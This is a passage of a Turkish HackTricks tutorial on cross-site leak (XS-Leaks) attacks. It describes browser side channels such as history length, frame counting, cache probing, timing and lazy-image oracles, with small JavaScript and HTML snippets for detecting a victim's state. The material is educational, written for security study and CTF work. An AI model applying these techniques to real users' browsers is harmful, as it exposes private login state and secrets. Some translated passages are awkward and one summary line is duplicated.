* **Özet:** URL yönlendirmelerinin gerçekleşip gerçekleşmediğini belirlemek için tarayıcının yönlendirme sınırını kullanın.
* **Kod Örneği**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Eğer bir tarayıcının takip edeceği **maksimum** yönlendirme sayısı **20** ise, bir saldırgan sayfasını **19 yönlendirme** ile yüklemeyi deneyebilir ve sonunda **kurbanı** test edilen sayfaya **yönlendirebilir**. Eğer bir **hata** tetiklenirse, o zaman sayfa kurbanı **yönlendirmeye çalışıyordu**.

### Geçmiş Uzunluğu

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: Yönlendirmeler
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Özet:** JavaScript kodu tarayıcı geçmişini manipüle edebilir ve uzunluk özelliği ile erişilebilir.
* **Kod Örneği**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**Geçmiş API** JavaScript koduna tarayıcı geçmişini manipüle etme izni verir, bu da bir kullanıcının ziyaret ettiği sayfaları **kaydeder**. Bir saldırgan uzunluk özelliğini dahil etme yöntemi olarak kullanabilir: JavaScript ve HTML gezinmesini algılamak için.\
**`history.length` kontrol edilir**, bir kullanıcının bir sayfaya **gezinmesi**, onu **aynı kök dizine geri dönüştürmesi** ve **`history.length`**'in yeni değerini **kontrol etmesi**.

### Aynı URL ile Geçmiş Uzunluğu

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: URL tahmin edilenle aynı mı
* **Özet:** Geçmiş uzunluğunu kötüye kullanarak bir çerçeve/açılır pencerenin konumunun belirli bir URL'de olup olmadığını tahmin etmek mümkündür.
* **Kod Örneği**: Aşağıda

Bir saldırgan JavaScript kodunu kullanarak **çerçeve/açılır pencerenin konumunu tahmin edilen bir yere manipüle edebilir** ve hemen **`about:blank`'e değiştirebilir**. Eğer geçmiş uzunluğu artarsa, bu URL'nin doğru olduğunu ve **URL'nin aynı olduğunda yeniden yüklenmediği için artma şansı olduğunu** gösterir. Eğer artmazsa, bu tahmin edilen URL'yi yüklemeye çalıştığını **ancak hemen ardından** **`about:blank`'i yüklediğimiz için**, geçmiş uzunluğu tahmin edilen URL'yi yüklerken hiçbir zaman artmaz.

```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```

### Kare Sayımı

* **Dahil Etme Yöntemleri**: Kareler, Açılır Pencereler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Özet:** `window.length` özelliğini inceleyerek iframe öğelerinin miktarını değerlendirin.
* **Kod Örneği**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Bir web sayfasındaki **çerçeve sayısını** `iframe` veya `window.open` ile açılan sayfada belirlemek, **kullanıcının o sayfadaki durumunu** belirlemeye yardımcı olabilir.\
Ayrıca, sayfada her zaman aynı sayıda çerçeve varsa, çerçeve sayısını **sürekli olarak** kontrol etmek, sızdırılabilecek bilgileri belirlemeye yardımcı olabilir.

Bu tekniğin bir örneği olarak, Chrome'da bir **PDF**, içsel olarak bir `embed` kullanıldığı için **çerçeve sayımı** ile **tespit edilebilir**. `zoom`, `view`, `page`, `toolbar` gibi bazı kontrol sağlayan [Açık URL Parametreleri](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) vardır, bu durum ilginç olabilir.

### HTMLElements

* **Dahil Etme Yöntemleri**: HTML Öğeleri
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Özet:** Sızan değeri okuyarak 2 olası durum arasındaki farkı ayırt edin
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML öğeleri aracılığıyla bilgi sızıntısı, özellikle dinamik medya dosyaları kullanıcı bilgilerine dayalı olarak oluşturulduğunda veya su işaretleri eklenerek medya boyutu değiştirildiğinde web güvenliğinde bir endişe oluşturur. Bu, saldırganların belirli HTML öğeleri tarafından açığa çıkarılan bilgileri analiz ederek olası durumlar arasında ayrım yapmalarını sağlayabilir.

### HTML Öğeleri Tarafından Açığa Çıkarılan Bilgiler

* **HTMLMediaElement**: Bu öğe medyanın `duration` ve `buffered` sürelerini ortaya çıkarır, bu bilgilere API'si aracılığıyla erişilebilir. [HTMLMediaElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: `videoHeight` ve `videoWidth`'i açığa çıkarır. Bazı tarayıcılarda, `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` ve `webkitDecodedFrameCount` gibi ek özellikler mevcuttur, bu da medya içeriği hakkında daha detaylı bilgiler sunar. [HTMLVideoElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Bu işlev, video oynatma kalitesi hakkında detaylar sağlar, bu da işlenen video veri miktarını gösterebilir. [getVideoPlaybackQuality() hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Bu öğe bir resmin `height` ve `width`'ini sızdırır. Ancak, bir resim geçersizse, bu özellikler 0 döndürecek ve `image.decode()` işlevi reddedilecektir, bu da resmin doğru bir şekilde yüklenemediğini gösterir. [HTMLImageElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Özelliği

* **Dahil Etme Yöntemleri**: HTML Öğeleri
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Özet:** Kullanıcının durumu veya durumu ile ilişkili web sitesi stilindeki değişiklikleri belirleyin.
* **Kod Örneği**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web uygulamaları, **kullanıcının durumuna bağlı olarak web sitesi stilini değiştirebilir**. Çapraz kökenli CSS dosyaları, **HTML link öğesi** ile saldırgan sayfasına gömülebilir ve **kurallar** saldırgan sayfaya **uygulanır**. Bir sayfa bu kuralları dinamik olarak değiştirirse, bir saldırgan bu farkları **kullanıcı durumuna bağlı olarak** tespit edebilir.\
Bir sızıntı tekniği olarak, saldırgan belirli bir HTML öğesinin CSS özelliklerini okumak için `window.getComputedStyle` yöntemini kullanabilir. Sonuç olarak, bir saldırgan etkilenen öğe ve özellik adı biliniyorsa, keyfi CSS özelliklerini okuyabilir.

### CSS Geçmişi

* **Dahil Etme Yöntemleri**: HTML Öğeleri
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Özet:** Bir URL'ye `:visited` stili uygulandığında ziyaret edildiğini belirleyin
* **Kod Örneği**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
[**Buna**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) göre, bu headless Chrome'da çalışmıyor.
{% endhint %}

CSS `:visited` seçicisi, kullanıcı tarafından daha önce ziyaret edilmiş URL'leri farklı şekilde biçimlendirmek için kullanılır. Geçmişte, `getComputedStyle()` yöntemi bu stil farklarını belirlemek için kullanılabilirdi. Ancak, modern tarayıcılar, bu yöntemin bir bağlantının durumunu ortaya çıkarmasını önlemek için güvenlik önlemleri uygulamıştır. Bu önlemler, her zaman bağlantının ziyaret edilmiş gibi hesaplanmış stilini döndürmek ve `:visited` seçicisi ile uygulanabilecek stilleri kısıtlamak içerir.

Bu kısıtlamalara rağmen, bir bağlantının ziyaret edilmiş durumunu dolaylı olarak belirlemek mümkündür. Bir teknik, kullanıcıyı CSS'den etkilenen bir alana etkileşime sokarak, özellikle `mix-blend-mode` özelliğini kullanarak kullanır. Bu özellik, öğelerin arka planlarıyla karıştırılmasına izin verir ve kullanıcı etkileşimine dayanarak ziyaret edilmiş durumu ortaya çıkarabilir.

Ayrıca, kullanıcı etkileşimi olmadan bağlantıların render zamanlamalarını sömürerek algılama sağlanabilir. Tarayıcılar ziyaret edilen ve ziyaret edilmemiş bağlantıları farklı şekilde render edebileceğinden, bu, renderleme sürecinde ölçülebilir bir zaman farkı oluşturabilir. Bu tekniği, ziyaret edilmiş durumu zamanlama analizi yoluyla algılanabilir hale getirmek için birden fazla bağlantı kullanarak gösteren bir kanıt konsepti (PoC), bir Chromium hata raporunda belirtildi.

Bu özellikler ve yöntemler hakkında daha fazla ayrıntı için belgelerine göz atın:

* `:visited`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Özet:** Google Chrome'da, bir sayfa X-Frame-Options kısıtlamaları nedeniyle çapraz kökenli bir siteye gömülmesi engellendiğinde, özel bir hata sayfası görüntülenir.
* **Kod Örneği**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Chrome'da, `X-Frame-Options` başlığı "deny" veya "same-origin" olarak ayarlanmış bir sayfa bir nesne olarak gömülüyorsa, bir hata sayfası görünür. Chrome, bu nesnenin `contentDocument` özelliği için diğer tarayıcılardan farklı olarak boş bir belge nesnesi (null yerine) döndürür. Saldırganlar, boş belgeyi algılayarak, özellikle geliştiriciler X-Frame-Options başlığını tutarsız bir şekilde ayarladıklarında, genellikle hata sayfalarını göz ardı ettiklerinde, kullanıcının durumu hakkında bilgi açığa çıkarabilir. Bu tür sızıntıları önlemek için güvenlik başlıklarının farkında olunması ve tutarlı bir şekilde uygulanması önemlidir.

### İndirme Tespiti

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Özet:** Bir saldırgan, iframeleri kullanarak dosya indirmelerini ayırt edebilir; iframenin devamlı erişilebilir olması, başarılı bir dosya indirme işlemini ima eder.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` başlığı, özellikle `Content-Disposition: attachment`, tarayıcıya içeriği görüntülemek yerine indirmesini talimat verir. Bu davranış, bir kullanıcının bir dosya indirme tetikleyen bir sayfaya erişiminin olup olmadığını tespit etmek için sömürülebilir. Chromium tabanlı tarayıcılarda, bu indirme davranışını tespit etmek için birkaç teknik bulunmaktadır:

1. **İndirme Çubuğu İzleme**:

* Bir dosya Chromium tabanlı tarayıcılarda indirildiğinde, tarayıcı penceresinin altında bir indirme çubuğu görünür.
* Saldırganlar, pencere yüksekliğindeki değişiklikleri izleyerek, indirme çubuğunun görünümünü çıkarımlayabilir ve bir indirme işleminin başlatıldığını öne sürebilir.

2. **İframelerle İndirme Navigasyonu**:

* Bir sayfa, `Content-Disposition: attachment` başlığını kullanarak bir dosya indirme tetiklediğinde, bir navigasyon olayına neden olmaz.
* İçeriği bir iframede yükleyerek ve navigasyon olaylarını izleyerek, içerik düzeninin bir dosya indirme işlemine neden olup olmadığını kontrol etmek mümkündür (navigasyon gerçekleşmez).

3. **İframeler Olmadan İndirme Navigasyonu**:

* İframe tekniğiyle benzer şekilde, bu yöntem bir iframe yerine `window.open` kullanmayı içerir.
* Yeni açılan pencerede navigasyon olaylarını izleyerek, bir dosya indirme işleminin tetiklenip tetiklenmediği (navigasyon gerçekleşmez) veya içeriğin içeride görüntülendiği belirlenebilir.

Yalnızca giriş yapmış kullanıcıların bu tür indirmeleri tetikleyebildiği senaryolarda, bu teknikler, tarayıcının indirme isteğine verdiği yanıta dayanarak dolaylı olarak kullanıcının kimlik doğrulama durumunu çıkarabilir.

### Bölümlenmiş HTTP Önbellek Atlatma <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Zamanlama
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Özet:** Bir saldırgan, iframeleri kullanarak dosya indirmelerini ayırt edebilir; iframenin devamlı erişilebilir olması, başarılı bir dosya indirme işlemini ima eder.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Bu teknik neden ilginç: Chrome artık **önbellek bölümlendirmesine** sahip ve yeni açılan sayfanın önbellek anahtarı şudur: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, ancak bir ngrok sayfası açarsam ve içinde fetch kullanırsam, önbellek anahtarı şu olacaktır: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **önbellek anahtarı farklıdır**, bu nedenle önbellek paylaşılamaz. Daha fazla ayrıntıya buradan ulaşabilirsiniz: [Önbelleği bölmekle güvenlik ve gizlilik kazanma](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Yorum [**buradan**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Eğer bir site `example.com`, `*.example.com/resource` kaynağını içeriyorsa, o kaynağın **önbellekleme anahtarı**, kaynağın doğrudan **üst düzey gezinme** ile istenmiş gibi olacaktır. Çünkü önbelleğe erişmek, bir kaynağı yüklemekten daha hızlıdır, sayfanın konumunu değiştirmeye çalışabilir ve durdurmayı 20ms (örneğin) sonra iptal etmeye çalışabilirsiniz. Eğer durdurmadan sonra köken değiştiyse, kaynağın önbelleğe alındığı anlamına gelir.\
Ya da sadece **potansiyel olarak önbelleğe alınmış sayfaya bazı fetch gönderebilir ve alınan zamanı ölçebilirsiniz**.

### Manuel Yönlendirme <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Yönlendirmeler
* **Daha Fazla Bilgi**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Özet:** Bir fetch isteğine verilen yanıtın bir yönlendirme olup olmadığını bulmak mümkündür
* **Kod Örneği**:

![](<../../.gitbook/assets/image (652).png>)

### AbortController ile Fetch <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Zamanlama
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Özet:** Bir kaynağı yüklemeye çalışabilir ve yüklenmeden önce yüklemenin kesilmesi mümkündür. Bir hata tetiklenirse, kaynağın önbelleğe alınıp alınmadığına bağlı olarak, kaynak önbelleğe alınmıştır veya alınmamıştır.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Yeni içerik önbelleğe alınmadan belirli bir kaynağı tarayıcı önbelleğinden çıkarmak ve kaynağın önbelleğe alınıp alınmadığını tespit etmek için _**fetch**_ ve _**setTimeout**_ kullanın. Ayrıca, yeni içerik önbelleğe alınmadan işlem gerçekleşir.

### Script Kirliliği

* **Dahil Etme Yöntemleri**: HTML Elemanları (script)
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Özet:** **Dahili fonksiyonları üzerine yazmak** ve hatta **çapraz kaynaklı script'ten** (doğrudan okunamayan) bu argümanları okumak mümkündür, bu değerli bilgilerin **sızmasına** neden olabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Hizmet İşçileri <a href="#service-workers" id="service-workers"></a>

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Özet:** Bir web sitesinin yürütme süresini hizmet işçileri kullanarak ölçün.
* **Kod Örneği**:

Verilen senaryoda, saldırgan, özellikle "saldırgan.com" alanlarından birinde bir **hizmet işçisi** kaydetmek için girişimi ele alır. Sonra, saldırgan hedef web sitesinde yeni bir pencere açar ve **hizmet işçisine** ana belgeden bir zamanlayıcı başlatmasını talimat verir. Yeni pencere yüklenmeye başladığında, saldırgan önceki adımda elde edilen referansı **hizmet işçisi** tarafından yönetilen bir sayfaya yönlendirir.

Önceki adımda başlatılan isteğin varışında, **hizmet işçisi** etkili bir şekilde navigasyon sürecini sonlandıran bir **204 (İçerik Yok)** durum kodu ile yanıt verir. Bu noktada, **hizmet işçisi** önceki adımda başlatılan zamanlayıcıdan bir ölçüm yakalar. Bu ölçüm, navigasyon sürecinde gecikmelere neden olan JavaScript'in süresinden etkilenir.

{% hint style="warning" %}
Bir yürütme zamanlamasında **ağ faktörlerini ortadan kaldırmak** ve **daha kesin ölçümler** elde etmek mümkündür. Örneğin, sayfanın yüklenmeden önce kullandığı kaynakları yükleyerek.
{% endhint %}

### Getirme Zamanlaması

* **Dahil Etme Yöntemleri**: Getirme API'si
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Özet:** Bir isteği gerçekleştirmenin ne kadar zaman aldığını ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Çapraz-Pencere Zamanlaması

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Özet:** `window.open` kullanarak bir isteği gerçekleştirmenin ne kadar zaman aldığını ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## HTML veya Yeniden Enjeksiyon ile

Burada, bir çapraz kaynaktan HTML'den bilgi sızdırmak için teknikler bulabilirsiniz **HTML içeriği enjekte ederek**. Bu teknikler, herhangi bir nedenle **HTML enjekte edebilir ancak JS kodu enjekte edemezsiniz** durumlarında ilginçtir.

### Sarkan İşaretleme

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Görüntü Tembel Yükleme

Eğer **içerik sızdırmak** ve **gizli öncesi HTML ekleyebiliyorsanız** **ortak sarkan işaretleme tekniklerini** kontrol etmelisiniz.\
Ancak, herhangi bir nedenden dolayı bunu **her karakter için yapmalısınız** (belki iletişim önbellek vuruşu yoluyla ise) bu hileyi kullanabilirsiniz.

HTML'deki **Görüntülerin** bir "**yükleniyor**" özniteliği vardır ve değeri "**tembel**" olabilir. Bu durumda, görüntü yalnızca görüntülendiğinde yüklenecek ve sayfa yüklenirken değil:

```html
<img src=/something loading=lazy >
```

Bu nedenle yapabileceğiniz şey, **web sayfasını sırrın önünde doldurmak için çok sayıda gereksiz karakter eklemektir** (Örneğin **binlerce "W"** gibi) veya **sırrın önüne** `<br><canvas height="1850px"></canvas><br>` gibi bir şey eklemektir.\
Sonra örneğin **enjeksiyonumuz bayrağın önünde görünüyorsa**, **resim yüklenecektir**, ancak bayrak **ardından görünüyorsa**, bayrak + gereksiz karakterler **yükleme işlemini engelleyecektir** (ne kadar gereksiz karakter yerleştireceğinizi denemeniz gerekecektir). Bu, [**bu yazıda**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) ne olduğunu gösterir.

Başka bir seçenek, izin veriliyorsa **scroll-to-text-fragment**'i kullanmaktır:

#### Scroll-to-text-fragment

Ancak, **botun sayfaya erişmesini sağlamak için** şunun gibi bir şey kullanabilirsiniz:

```
#:~:text=SECR
```

Web sayfası şöyle olacak: **`https://victim.com/post.html#:~:text=SECR`**

Burada post.html saldırganın gereksiz karakterleri ve tembel yükleme görüntüsünü içerir ve ardından botun sırrı eklenir.

Bu metin, botun sayfadaki `SECR` metnini içeren herhangi bir metne erişmesini sağlayacak. Çünkü bu metin sır ve **görüntünün hemen altında** ve **görüntü yalnızca doğru tahmin edilen sır olduğunda yüklenecek**. Bu şekilde, sırrı **harf harf dışarı sızdırmak için bir oracle** elde etmiş olacaksınız.

Bunu sömürmek için bazı kod örnekleri: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Görüntü Tembel Yükleme Zaman Tabanlı

Eğer **harf harf tahmin etmek ve bunu ölçmek** için birkaç kez denemek mümkün değilse ve bu, görüntünün yüklendiğini saldırganın anlamasını sağlayacak bir harici görüntü yüklemek mümkün değilse, başka bir seçenek, **görüntünün yüklendiğini gösterebilecek** bir harici görüntü yüklemek olabilir. Eğer görüntü yüklendiyse, tüm isteklerin yüklenmesi, görüntünün yüklenmediği durumdan daha uzun sürecektir. Bu, [**bu yazının çözümünde**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **kullanılan şeydir:**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Eğer `jQuery(location.hash)` kullanılıyorsa, **bazı HTML içeriğinin varlığını** zamanlama yoluyla tespit etmek mümkündür, çünkü eğer seçici `main[id='site-main']` eşleşmiyorsa, geri kalan **seçicileri kontrol etmesine gerek yoktur**:

```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```

### CSS Enjeksiyonu

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## Savunmalar

[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) adresinde önerilen önlemler bulunmaktadır ve her bölümde [https://xsleaks.dev/](https://xsleaks.dev/) adresinde daha fazla bilgi için bakabilirsiniz.

## Referanslar

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Sıfırdan Kahraman'a AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬** [**Discord grubuna**](https://discord.gg/hRep4RUj7f) **veya** [**telegram grubuna**](https://t.me/peass) **katılın veya bizi Twitter 🐦** [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
